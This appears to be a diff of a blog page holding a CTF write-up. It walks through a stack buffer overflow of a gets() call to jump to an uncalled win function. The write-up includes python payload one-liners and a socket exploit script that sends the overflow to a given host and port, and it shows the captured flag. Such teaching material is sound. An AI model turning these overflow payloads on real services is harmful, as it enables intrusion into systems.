@@ -57,7 +57,7 @@ Solution I would like to preface this, that I have done this exact challenge fro
 
 
 
-    <meta property="article:section" content="CTF" />
+    <meta property="article:section" content="Cyber-Security" />
 
 
 
@@ -84,7 +84,7 @@ Solution I would like to preface this, that I have done this exact challenge fro
         <a href="/" style="text-decoration: none;">
     <div class="logo">
         
-            <span class="logo__mark">></span>
+            <span class="logo__mark">&gt;</span>
             <span class="logo__text">shanks</span>
             <span class="logo__cursor" style=
                   "
@@ -178,7 +178,7 @@ Solution I would like to preface this, that I have done this exact challenge fro
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
-        <span class="tag"><a href="https://shanks.dev/categories/ctf/">CTF</a></span>
+        <span class="tag"><a href="https://shanks.dev/categories/cyber-security/">Cyber-Security</a></span>
         
     </p>
 
@@ -203,71 +203,71 @@ Solution I would like to preface this, that I have done this exact challenge fro
 <p>Now on to how I retrieved the flag!</p>
 <p>First we look at the <a href="../src/chall.c">chall.c</a> file and notice immediately the <code>gets</code> function. A known vulnerable C function that is susceptible to buffer overflows. Furthermore, there’s an uncalled <code>win</code> function which will print out the flag. Now we want to overflow the <code>gets</code> function such that we can retrieve the flag through the uncalled <code>win</code> function.</p>
 <p>How do we overflow the <code>gets</code> function? Well you need to pass in enough input until you can begin to control where you end up in memory. But we will need to know where in memory we want to go. How is this done? Using <code>readelf</code> I could find out where in memory the <code>win</code> function was loaded. Note that the <code>-s</code> is for symbols.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">readelf -s chall
-</code></pre></div><p>We see on our test machine that the win function is located in the following address: <code>0x08048486</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>readelf -s chall
+</span></span></code></pre></div><p>We see on our test machine that the win function is located in the following address: <code>0x08048486</code></p>
 <p>Now we just need to pass in enough values until we can manipulate the memory address. I achived this by passing in an obnoxious amount of <code>A</code>’s to the program until I got a seg fault. I did this in chunks of 4 A’s at a time. Eventually I realized that adding 12 characters to the input string originally made to be size of 56 caused a segfault.</p>
 <p>Checking with</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo dmesg
-</code></pre></div><p>We can see where the instruction pointer (<code>ip</code>) is pointing when it seg faults. Let’s add 1 more character to the string, like <code>A</code> we see where we end up with the tool. Using dmesg we see that theres a seg fault at an address ending in <code>0x41</code>, which should look familiar as <code>0x41</code> is the hex value of <code>A</code>. Testing it with <code>B</code> we see it ending with <code>0x42</code>. Now we know we can manipulate the memory to get to the <code>win</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dmesg
+</span></span></code></pre></div><p>We can see where the instruction pointer (<code>ip</code>) is pointing when it seg faults. Let’s add 1 more character to the string, like <code>A</code> we see where we end up with the tool. Using dmesg we see that theres a seg fault at an address ending in <code>0x41</code>, which should look familiar as <code>0x41</code> is the hex value of <code>A</code>. Testing it with <code>B</code> we see it ending with <code>0x42</code>. Now we know we can manipulate the memory to get to the <code>win</code> function.</p>
 <p>Since we want to end up in <code>0x08048486</code>, we will have to understand how memory works a little more. The concept of <a href="https://en.wikipedia.org/wiki/Endianness">Endianness</a> is important here. <a href="https://youtu.be/k4hqdVo3cqk?t=1347">John does a great explanation about it here</a>. But to summarize, essentially we need to take chunks of bytes (pairs of 2 in this case) and ‘invert’ it so to speak. These bytes are stored in memory using Little Endian encoding. Take a look below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">We want to change this address into Little Endian:
-0x08048486
-
-Grab the first 2 &#39;characters&#39; and put them at the end, then grab the next 2 &#39;characters&#39; and put them in the second to last place, and so on:
-0x86840408
-
-Here is how we will represent the bytes in Python:
-\x86\x84\x04\x08
-</code></pre></div><p>We check the conversion to bytes using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | xxd
-</code></pre></div><p>Testing with the local function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | ./chall
-</code></pre></div><p><img src="../imgs/overflow.png" alt="overflow"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>We want to change this address into Little Endian:
+</span></span><span style="display:flex;"><span>0x08048486
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Grab the first 2 &#39;characters&#39; and put them at the end, then grab the next 2 &#39;characters&#39; and put them in the second to last place, and so on:
+</span></span><span style="display:flex;"><span>0x86840408
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here is how we will represent the bytes in Python:
+</span></span><span style="display:flex;"><span>\x86\x84\x04\x08
+</span></span></code></pre></div><p>We check the conversion to bytes using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | xxd
+</span></span></code></pre></div><p>Testing with the local function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | ./chall
+</span></span></code></pre></div><p><img src="../imgs/overflow.png" alt="overflow"></p>
 <p>Lets write up a quick Python script, <a href="../src/bin-exploit.py">here is the direct download</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-
-<span style="color:#f92672">import</span> socket <span style="color:#75715e"># dealing with internet connections</span>
-<span style="color:#f92672">import</span> argparse <span style="color:#75715e"># pass arguments when calling the script so we can use it for any other CTF challenges</span>
-<span style="color:#f92672">import</span> struct <span style="color:#75715e"># for changing the memory address into Little Endian.</span>
-
-<span style="color:#75715e"># Build out the arg parser and args to take in</span>
-parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
-parser<span style="color:#f92672">.</span>add_argument(
-    <span style="color:#e6db74">&#34;host&#34;</span>,
-    type<span style="color:#f92672">=</span>str,
-    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The hostname or IP address to connect to&#34;</span>
-)
-parser<span style="color:#f92672">.</span>add_argument(
-    <span style="color:#e6db74">&#34;port&#34;</span>,
-    type<span style="color:#f92672">=</span>int,
-    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port for the service to connect to&#34;</span>
-)
-
-args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
-
-<span style="color:#75715e"># for testing</span>
-print(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
-
-<span style="color:#75715e"># Swaps the memory address to Little Endian for us</span>
-ip <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x08048486</span>)
-
-<span style="color:#75715e"># 69 here represents the offset + 1</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(
-    [
-        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">69</span>,
-        ip
-    ]
-)
-<span style="color:#75715e"># Add the bytes for a newline to mimick pressing the &#34;Enter&#34; key</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-
-<span style="color:#75715e"># Takes care of closing the socket</span>
-<span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket() <span style="color:#66d9ef">as</span> conn:
-    conn<span style="color:#f92672">.</span>connect((args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port))
-    <span style="color:#75715e"># print(conn.recv(4096).decode(&#34;utf-8&#34;))</span>
-    conn<span style="color:#f92672">.</span>send(payload)
-    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</code></pre></div><p>Running the script, we get the following response from the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket <span style="color:#75715e"># dealing with internet connections</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse <span style="color:#75715e"># pass arguments when calling the script so we can use it for any other CTF challenges</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct <span style="color:#75715e"># for changing the memory address into Little Endian.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build out the arg parser and args to take in</span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;host&#34;</span>,
+</span></span><span style="display:flex;"><span>    type<span style="color:#f92672">=</span>str,
+</span></span><span style="display:flex;"><span>    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The hostname or IP address to connect to&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;port&#34;</span>,
+</span></span><span style="display:flex;"><span>    type<span style="color:#f92672">=</span>int,
+</span></span><span style="display:flex;"><span>    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port for the service to connect to&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for testing</span>
+</span></span><span style="display:flex;"><span>print(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Swaps the memory address to Little Endian for us</span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x08048486</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 69 here represents the offset + 1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span>    [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">69</span>,
+</span></span><span style="display:flex;"><span>        ip
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add the bytes for a newline to mimick pressing the &#34;Enter&#34; key</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Takes care of closing the socket</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket() <span style="color:#66d9ef">as</span> conn:
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect((args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(conn.recv(4096).decode(&#34;utf-8&#34;))</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>Running the script, we get the following response from the server:</p>
 <pre tabindex="0"><code>magpie{0mn1_fl4g_3v3rywh3r3}
 </code></pre>
       </div>
@@ -447,7 +447,7 @@ payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</spa
 
 
 
-<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
 
 
 
